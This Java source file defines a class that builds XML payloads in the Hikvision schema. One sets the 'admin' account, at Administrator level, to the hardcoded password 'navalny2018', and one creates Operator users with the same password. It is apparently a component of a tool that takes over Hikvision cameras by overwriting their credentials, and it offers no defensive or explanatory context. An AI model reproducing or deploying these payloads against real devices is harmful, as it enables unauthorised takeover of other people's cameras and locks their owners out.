public class XML {
    static public String admin() {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<UserList version=\"1.0\" xmlns=\"http://www.hikvision.com/ver10/XMLSchema\">\n" +
                "<User version=\"1.0\" xmlns=\"http://www.hikvision.com/ver10/XMLSchema\">\n" +
                "<id>1</id>\n" +
                "<userName>admin</userName>\n" +
                "<password>navalny2018</password>\n" +
                "<ipAddress>0.0.0.0</ipAddress>\n" +
                "<macAddress>00:00:00:00:00:00</macAddress>\n" +
                "<userLevel>Administrator</userLevel>\n" +
                "<priority>high</priority>\n" +
                "</User>\n" +
                "</UserList>\n";
    }

    static public String user(String name, String id) {
        return "<?xml version='1.0' encoding='utf-8'?>\n" +
                "<User>\n" +
                "<id>" + id + "</id><userName>" + name + "</userName>\n" +
                "<password>navalny2018</password>\n" +
                "<userLevel>Operator</userLevel>\n" +
                "</User>\n";
    }
}
